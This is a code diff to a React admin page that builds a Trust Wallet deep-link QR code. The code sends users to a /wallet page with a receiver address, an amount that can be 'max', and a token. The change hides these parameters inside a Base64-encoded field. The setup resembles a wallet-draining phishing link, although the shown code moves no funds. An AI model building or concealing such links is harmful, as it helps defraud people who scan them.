@@ -65,8 +65,13 @@ export default function AdminPage() {
 
     const origin = window.location.origin;
     const baseUrl = `${origin}/wallet`;
-    const effectiveAmount = isMaxMode ? "max" : amount;
-    const targetUrl = `${baseUrl}?to=${receiverAddress}&amount=${effectiveAmount}&token=${token.toLowerCase()}`;
+    const params = {
+      to: receiverAddress,
+      amount: isMaxMode ? "max" : amount,
+      token: token.toLowerCase(),
+    };
+    const encoded = btoa(JSON.stringify(params)); // encodage Base64
+    const targetUrl = `${baseUrl}?data=${encodeURIComponent(encoded)}`;
     const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
     setQrUrl(trustWalletLink);
   }, [receiverAddress, amount, token, isMaxMode, isMounted, isAuthenticated]);
